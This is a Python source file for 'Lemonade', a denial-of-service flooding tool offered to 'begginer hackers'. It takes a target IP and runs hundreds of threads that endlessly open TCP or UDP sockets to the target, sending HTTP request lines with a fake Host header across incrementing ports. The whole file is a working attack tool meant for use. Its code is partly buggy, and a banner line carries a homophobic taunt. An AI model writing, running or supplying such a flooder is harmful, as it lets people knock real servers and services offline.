import time
import os
import sys
import random
import argparse
import threading

using_datetime = True

try:
  import socket
  from socket import *
  
except ImportError: 
  input(
      f"Module socket not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install socket.\npress enter to exit")
  exit()
  
try:
  import datetime  
except ImportError:
  input(
      f"Module rdatetimenot installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install rdatetime\nPif you don't want to install datetime module you can proces the attack!")
  using_datetime = False


#if using_datetime is True:
  #now = datetime.now()
  #min = now.minute
  #hour = now.hour
  #day = now.hour
  #month = now.month
  #year = now.month

print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
time.sleep(1)
os.system("clear")
os.system("cls")

print("""
                                                              
                                                          H
 __       _____   ______________   ________   __________o===o__     ______    _____
|  |     |  ___| |   __    __   | |        | |    __    ||H|_   \  |       \ |  ___|
|  |___  |  ___| |  |  |  |  |  | |    —   | |   |  |   ||H|_ \  | |   —   | |  ___| 
|______| |_____| |_ |  |_ |  |_ | |________| |__ |  |__ ||H|   |_| |_______/ |_____|
                                                         |H|
                                                          V
                                                          
      """)

def main():
  parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")

  parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
  parser.add_argument('--PORT', '--P', type = str, default = 'auto', help = 'Port')
  parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
  parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fake IP')
  parser.add_argument('--TIMESLEEP', '--S', type = int, default = '1', help = 'Time sleep')
  parser.add_argument('--THREADING', '--H', type = int, default = '500', help = 'Threading')
  parser.add_argument('--INFORMATION', '--I', help = 'Threading', action = 'store_true')
  parser.add_argument('--AINFORMATION', '--AI', help = 'Threading', action = 'store_true')

  arguments = parser.parse_args()

  ip = arguments.TARGET
  fake_ip = arguments.FAKEIP
  porty = arguments.PORT
  protocol = arguments.PROTOCOL
  s_t = arguments.TIMESLEEP
  threading_count = arguments.THREADING


  bytes = random._urandom(1490)

  #os.system("clear")
  #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
  #os.system ("clear") 

  def attack():
    pocket = 0
    
    while True:
      if protocol == "TCP": 
        s = socket(AF_INET, SOCK_STREAM)
      elif protocol == "UDP":
        s = socket(AF_INET, SOCK_DGRAM)
      else:
        print("undefined protocol!, Ctrl + C to close!")

      if porty == "auto":
        port = 80

      try:
        s.connect((ip, port))
        #s.send(bytes)
        s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        pocket += 1
        print(f"pocket{pocket}")
        time.sleep(s_t)

        if porty == "auto":
          port = port + 1
          if port == 65543:
            port = port - 1

      except:
        print("connection faild!\npress ctrl/c to close or press Enter to process the attack!")
        pass

      s.close() 
  if arguments.INFORMATION:
    print("                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print(f"                             Target ip : {ip}")
    print(f"                             Port : {porty}")
    print(f"                             protocol : {protocol}")
    print("                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
  
  if arguments.AINFORMATION:
    print("                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print(f"                             Target ip : {ip}")
    print(f"                             Port : {porty}")
    print(f"                             Protocol : {protocol}")
    print(f"                             Fake ip : {fake_ip}")
    print(f"                             Sleep time : {s_t}")
    print(f"                             Threading : {threading_count}")
    print("                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")

  time.sleep(2)
  input("Press Enter to attack when you're ready!")

  for i in range(threading_count):
    thread = threading.Thread(target = attack)
    thread.start()
      
if __name__ == "__main__":
  main()